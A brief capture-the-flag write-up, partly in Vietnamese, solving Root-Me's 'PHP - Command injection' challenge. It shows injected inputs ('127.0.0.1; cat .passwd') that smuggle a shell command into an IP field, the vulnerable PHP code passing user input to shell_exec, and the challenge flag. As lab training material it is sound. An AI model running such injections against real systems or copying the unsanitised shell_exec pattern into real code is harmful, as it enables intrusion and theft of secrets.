# [PHP - Command injection](https://www.root-me.org/en/Challenges/Web-Server/PHP-Command-injection)

## Solutions

- Submit query: `127.0.0.1; cat index.php`
  - Đọc được code PHP trong response:

    ```php
    <?php 
    $flag = "".file_get_contents(".passwd")."";
    if(isset($_POST["ip"]) && !empty($_POST["ip"])){
            $response = shell_exec("timeout 5 bash -c 'ping -c 3 ".$_POST["ip"]."'");
            echo $response;
    }
    ?>
    ```

- Submit query: `127.0.0.1; cat .passwd`
  - Lấy được flag: `S3rv1ceP1n9Sup3rS3cure`
